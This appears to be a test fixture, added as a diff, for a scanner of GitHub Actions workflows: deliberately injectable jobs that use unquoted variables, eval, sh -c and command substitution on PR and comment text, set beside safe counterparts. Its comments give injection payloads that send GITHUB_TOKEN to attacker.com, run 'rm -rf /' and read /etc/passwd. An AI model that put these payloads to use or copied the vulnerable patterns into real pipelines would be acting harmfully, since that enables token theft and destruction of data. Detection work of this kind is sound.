@@ -1,0 +1,188 @@
+name: Command Injection via Shell Metacharacters
+on:
+  # Privileged triggers for critical detection
+  pull_request_target:
+    types: [opened, synchronize]
+  issue_comment:
+    types: [created]
+
+jobs:
+  # ===========================================
+  # VULNERABLE: Unquoted Environment Variables
+  # ===========================================
+
+  # CRITICAL: Unquoted env var containing untrusted input
+  unsafe-unquoted-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Process PR title unsafely (unquoted)
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # VULNERABLE: Without quotes, shell performs word splitting and glob expansion
+          # Attack: PR title = "* /etc/passwd" or "$(malicious_command)"
+          echo $PR_TITLE
+
+  # SAFE: Properly quoted env var
+  safe-quoted-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Process PR title safely (quoted)
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # SAFE: Double quotes prevent word splitting and glob expansion
+          echo "$PR_TITLE"
+
+  # ===========================================
+  # VULNERABLE: eval with Untrusted Input
+  # ===========================================
+
+  # CRITICAL: eval with untrusted env var (even when quoted)
+  unsafe-eval-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Eval with untrusted env var
+        env:
+          COMMAND: ${{ github.event.pull_request.title }}
+        run: |
+          # VULNERABLE: eval parses the string again, enabling command injection
+          # Attack: PR title = 'echo hello"; curl attacker.com #'
+          eval "echo $COMMAND"
+
+  # CRITICAL: eval with direct untrusted input
+  unsafe-eval-direct:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Eval with direct untrusted input
+        run: |
+          # VULNERABLE: Direct untrusted input in eval
+          # Attack: PR title = '$(curl attacker.com/exfil?token=$GITHUB_TOKEN)'
+          eval "echo ${{ github.event.pull_request.title }}"
+
+  # ===========================================
+  # VULNERABLE: sh -c / bash -c with Untrusted Input
+  # ===========================================
+
+  # CRITICAL: sh -c with untrusted env var
+  unsafe-sh-c-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sh -c with untrusted env var
+        env:
+          COMMENT: ${{ github.event.comment.body }}
+        run: |
+          # VULNERABLE: sh -c creates a new shell, parsing the string again
+          # Attack: comment = 'hello"; rm -rf / #'
+          sh -c "echo $COMMENT"
+
+  # CRITICAL: bash -c with untrusted env var
+  unsafe-bash-c-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: bash -c with untrusted env var
+        env:
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          # VULNERABLE: bash -c creates a nested shell that parses again
+          bash -c "echo $PR_BODY"
+
+  # CRITICAL: sh -c with direct untrusted input
+  unsafe-sh-c-direct:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sh -c with direct untrusted input
+        run: |
+          # VULNERABLE: Direct untrusted input in sh -c
+          sh -c "echo ${{ github.event.pull_request.title }}"
+
+  # ===========================================
+  # VULNERABLE: Command Substitution
+  # ===========================================
+
+  # CRITICAL: Command substitution $() with untrusted env var
+  unsafe-cmd-subst-paren:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Command substitution with untrusted env var
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # VULNERABLE: Command substitution with untrusted input
+          # Attack: PR title = '$(cat /etc/passwd)'
+          result=$(echo $PR_TITLE)
+          echo "Result: $result"
+
+  # CRITICAL: Backtick command substitution with untrusted env var
+  unsafe-cmd-subst-backtick:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Backtick substitution with untrusted env var
+        env:
+          COMMENT: ${{ github.event.comment.body }}
+        run: |
+          # VULNERABLE: Backtick substitution with untrusted input
+          result=`echo $COMMENT`
+          echo "Result: $result"
+
+  # ===========================================
+  # SAFE PATTERNS
+  # ===========================================
+
+  # SAFE: Properly quoted in all contexts
+  safe-proper-quoting:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Safe usage with proper quoting
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # SAFE: Double-quoted variable prevents word splitting
+          echo "$PR_TITLE"
+
+          # SAFE: Using printf for safer output
+          printf '%s\n' "$PR_TITLE"
+
+  # SAFE: Using environment variables to pass to subshell
+  safe-subshell-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pass env var to subshell safely
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # SAFE: Pass variable via environment, not interpolation
+          export PR_TITLE
+          sh -c 'echo "$PR_TITLE"'
+
+  # SAFE: Trusted inputs (github.sha, github.repository, etc.)
+  safe-trusted-inputs:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Using trusted inputs
+        env:
+          SHA: ${{ github.sha }}
+          REPO: ${{ github.repository }}
+        run: |
+          # SAFE: These are trusted inputs, not user-controlled
+          echo $SHA
+          echo $REPO
+
+  # ===========================================
+  # MULTIPLE VULNERABILITIES
+  # ===========================================
+
+  # CRITICAL: Multiple issues in one step
+  unsafe-multiple-issues:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Multiple vulnerabilities
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          # Multiple unsafe usages
+          echo $PR_TITLE                    # Unquoted
+          eval "echo $PR_BODY"              # eval
+          sh -c "process $PR_TITLE"         # sh -c
+          result=$(grep $PR_TITLE file.txt) # command substitution
